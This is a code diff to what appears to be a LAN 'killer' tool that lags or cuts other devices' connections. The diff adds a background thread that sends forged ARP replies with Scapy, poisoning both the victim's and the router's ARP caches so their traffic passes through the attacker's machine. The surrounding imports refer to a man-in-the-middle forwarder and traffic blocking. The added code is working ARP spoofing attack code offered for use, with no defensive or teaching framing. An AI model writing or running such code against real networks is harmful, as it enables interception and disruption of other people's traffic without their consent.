@@ -2,6 +2,7 @@ from scapy.all import ARP, Ether, conf
 from time import sleep
 import sys
 import subprocess
+import threading
 
 from networking.forwarder import MitmForwarder, _MAX_DELAY_MS, _MAX_SHAPING_KBPS
 from tools.pfctl import ensure_pf_enabled, install_anchor, block_all_for, unblock_all_for
@@ -197,6 +198,10 @@ class Killer:
             return
         sock = self._socket
         if sock is None:
+            # Cold Npcap socket: open off-thread so GUI never blocks, but still
+            # fire poison immediately (Driver Easy / first Lag ON used to wait
+            # until the ARP worker's first _get_socket() finished).
+            self._poison_arp_now_async(victim, seq, repeats, delay_s)
             return
         to_victim = Ether(dst=victim['mac'])/ARP(
             op=2,
@@ -226,6 +231,47 @@ class Killer:
                 return
             if delay_s > 0:
                 sleep(delay_s)
+
+    def _poison_arp_now_async(self, victim, seq=0, repeats=1, delay_s=0.0):
+        """Background poison burst when the cached L2 socket is cold."""
+
+        def _work():
+            try:
+                from scapy.all import sendp
+
+                iface = self.iface.guid if getattr(self.iface, 'guid', None) else self.iface.name
+                if not iface or iface == 'NULL':
+                    return
+                to_victim = Ether(dst=victim['mac'])/ARP(
+                    op=2,
+                    psrc=self.router['ip'],
+                    hwsrc=self.iface.mac,
+                    pdst=victim['ip'],
+                    hwdst=victim['mac'],
+                )
+                to_router = Ether(dst=self.router['mac'])/ARP(
+                    op=2,
+                    psrc=victim['ip'],
+                    hwsrc=self.iface.mac,
+                    pdst=self.router['ip'],
+                    hwdst=self.router['mac'],
+                )
+                for _ in range(max(1, int(repeats))):
+                    if self._op_seq.get(victim['mac']) != seq or victim['mac'] not in self.killed:
+                        break
+                    sendp(to_victim, iface=iface, verbose=0)
+                    sendp(to_router, iface=iface, verbose=0)
+                    if delay_s > 0:
+                        sleep(delay_s)
+                # Warm the persistent socket for the worker loop.
+                self._get_socket()
+            except Exception:
+                pass
+
+        try:
+            threading.Thread(target=_work, name='zubcut-poison-burst', daemon=True).start()
+        except Exception:
+            pass
 
     def apply_percent_cut(self, victim, pass_percent=100, debug=False):
         """
